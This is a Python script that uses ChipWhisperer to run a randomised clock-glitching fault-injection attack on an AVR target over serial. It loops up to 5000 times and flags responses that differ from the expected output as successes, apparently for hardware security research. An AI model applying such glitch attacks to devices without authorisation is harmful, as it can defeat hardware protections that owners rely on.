#!/usr/bin/env python3

# 16mhz synchronous clock
# correct:  '53', '00', '00', '20', '10', 'ff', 'aa', '20', '00', '0c', 'bb', '28', '00', '94']

import sys
import chipwhisperer as cw
import serial
import csv

class AvrSpecial:
  def __init__(self):
    self.ser = serial.Serial("/dev/ttyUSB0",9600,timeout=2.0)

  def drive(self,in_text=None):
    time.sleep(0.5)
    self.ser.write(b"#\x10\xFF\xAC\x00\x53\x00\x00\x00\x00\x00\x20\x00\x00\x00\x14\x00\xAA\x00\x28\x00\x00\x00\x14\x00\xBB\x00\x20\x00\x00\x00\x15\x00\xCC#")
    x = self.ser.read(1)
    if x != b'#':
      print("Critical Error: expected '#', got ",)
      print(x)
      sys.exit(0)
    x = self.ser.read(16)
    sys.stdout.write(str(["%02x" % ix for ix in x]))
    return x

scope = cw.scope()
scope.default_setup()
target = cw.target(scope)

print("Configuring UART")
target.init()

print("Entering glitch loop (attack ver)")
import uuid

# csvfile = open("eggs-%s.csv" % uuid.uuid4(),"w",newline='')
# csvwriter = csv.writer(csvfile,delimiter=',')

scope.io.target_pwr = True

scope.gain.gain = 25
scope.adc.samples=3000
scope.adc.offset = 0
scope.adc.basic_mode = "falling_edge"
scope.clock.clkgen_freq = 16000000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "clock_or"
scope.glitch.trigger_src = 'ext_single'
scope.io.hs2 = "glitch"
scope.io.glitch_hp  = True
scope.io.glitch_lp = False

# ser = serial.Serial("/dev/ttyUSB0",9600,timeout=3.0)

import random
import time

tryCount = 1

import base64

bp = AvrSpecial()
while tryCount < 5000:
  time.sleep(0.5)
  tryCount += 1
  scope.glitch.width = 30 + random.randint(-5,5)
  if random.randint(1,10) % 2 == 0:
    scope.glitch.offset = 37 + random.randint(-5,5)
  else:
    scope.glitch.offset = -37 + random.randint(-5,5)
  scope.glitch.repeat = random.randint(1,3)
  scope.glitch.ext_offset = 1 + (tryCount / 10)
  scope.arm()
  time.sleep(0.1)
  sys.stdout.write("E:%d, R:%d, W:%d, O:%d : " % (scope.glitch.ext_offset,scope.glitch.repeat,scope.glitch.width,scope.glitch.offset),)
  x = bp.drive()
  if x[2:] == b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF":
    print("Mute")
  elif x[2:] != b"\x53\x00\x00\x20\x00\xff\xaa\x28\x00\xff\xbb\x20\x00\xff":
    print("Success!")
  else:
    print("")
  scope.capture()
  sys.stdout.flush()

scope.io.target_pwr = False
target.dis()
scope.dis()
sys.exit(0)


